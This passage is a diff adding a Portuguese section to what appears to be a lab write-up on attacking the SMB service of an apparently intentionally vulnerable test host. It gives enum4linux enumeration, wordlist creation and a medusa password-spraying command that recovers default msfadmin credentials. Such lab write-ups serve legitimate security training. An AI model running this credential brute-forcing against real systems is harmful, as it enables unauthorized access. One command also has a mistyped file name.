@@ -48,5 +48,25 @@ Na imagem9 podemos ver o site aberto e com o acesso feito com o usuário e senha
 
 # ATAQUE SERVIÇO SMB
 
+Vamos começar rodando o comando enum4linux -a 192.168.222.3 | tee enum4_output.txt
 
+Com o comando obtivemos várias informações sobre o host em questão, conforme ilustrado na imagem10.
 
+Vamos criar os aquivos de usuário e senha para realizar o ataque, com os comandos abaixo:
+  echo -e "user\nmsfadmin\nservice" > smb_users.txt
+  echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+Arquivos ilustrados na imagem11.
+
+Agora vamos ao ataque propriamente digo, utilizando o comando abaixo:
+
+medusa -h 192.168.222.3 -U smb_users.txt -P senhas_spray -M smbnt -t2 -T 50 onde:
+  -h host albo
+  -U indica qual arquivo ele vai buscar os usuários
+  -P indica qual arquivo ele vai buscar as senhas
+  -M indica o módulo que vai ser usado, no caso o módulo smbnt
+  -t número de tentativas simultâneas, no caso 2
+  - T hosts em paralelo
+
+Executando o comando temos a saída ilustrada na imagem12.
+Analisando a saída do comando percebemos que temos uma saida AACOUNT FOUND com o usuário msfadmin e senha msfadmin, na qual será usada para acesso ao compartilhamento de rede.
